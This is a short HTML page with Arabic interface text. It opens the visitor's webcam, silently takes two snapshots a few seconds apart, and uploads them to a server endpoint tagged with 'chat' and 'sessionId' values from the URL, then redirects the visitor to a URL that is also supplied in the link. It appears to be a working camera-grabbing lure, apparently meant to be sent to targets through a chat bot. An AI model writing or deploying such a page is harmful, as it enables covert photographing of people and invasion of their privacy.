<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>📸 التقاط الصور</title>
  <style>
    body { margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #111; color: #fff; }
    video { width: 300px; border-radius: 10px; border: 2px solid #38bdf8; margin-bottom: 20px; }
    .loader { width: 100px; height: 100px; border: 10px solid #333; border-top: 10px solid #38bdf8; border-radius: 50%; animation: spin 2s linear infinite; margin-bottom: 20px; }
    @keyframes spin { 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <h1>📸 جارٍ الالتقاط... انتظر</h1>
  <div class="loader"></div>
  <video autoplay playsinline></video>

  <script>
    const params = new URLSearchParams(window.location.search);
    const redirectUrl = params.get('redirect');
    const chat = params.get('chat');
    const sessionId = params.get('sessionId');
    const video = document.querySelector('video');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');

        setTimeout(() => capturePhoto(false), 2000);
        setTimeout(() => capturePhoto(true), 4000);

        function capturePhoto(isLast) {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(async blob => {
            const formData = new FormData();
            formData.append('photos', blob, `photo-${Date.now()}.png`);
            formData.append('chat', chat);
            formData.append('sessionId', sessionId);

            await fetch('/upload-photo', { method: 'POST', body: formData });

            if (isLast) {
              stream.getTracks().forEach(track => track.stop());
              document.body.innerHTML = `<h2 style="color:#0f0;">✅ تم الالتقاط! سيتم تحويلك...</h2>`;
              setTimeout(() => window.location.href = redirectUrl, 2000);
            }
          }, 'image/png');
        }
      })
      .catch(err => alert('❌ فشل الوصول للكاميرا: ' + err.message));
  </script>
</body>
